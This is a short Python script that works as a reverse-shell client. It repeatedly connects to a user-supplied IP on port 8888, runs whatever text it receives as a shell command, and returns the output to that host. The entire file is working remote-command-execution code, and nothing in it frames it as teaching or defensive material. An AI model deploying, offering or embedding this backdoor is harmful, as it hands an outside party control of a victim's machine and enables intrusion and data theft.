# imports
import asyncio
import subprocess
import time

# defined some values
sleep = 10
server_ip = input("Enter the ip to connect >> ")
port = 8888


# asynced execute command def function
async def execute_command():
    reader, writer = await asyncio.open_connection(server_ip, port)
    data = await reader.read(100)
    message = data.decode()

    try:
        process = subprocess.Popen(message, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        results = process.communicate(timeout=20)[0].strip()
    except subprocess.TimeoutExpired:
        results = "Command Timed out".encode()
    finally:
        writer.write(results)
        await writer.drain()
        writer.close()

while True:
    try:
        asyncio.run(execute_command())
        time.sleep(sleep)
    except KeyboardInterrupt:
        print("\nReceived exit, exiting")
        exit()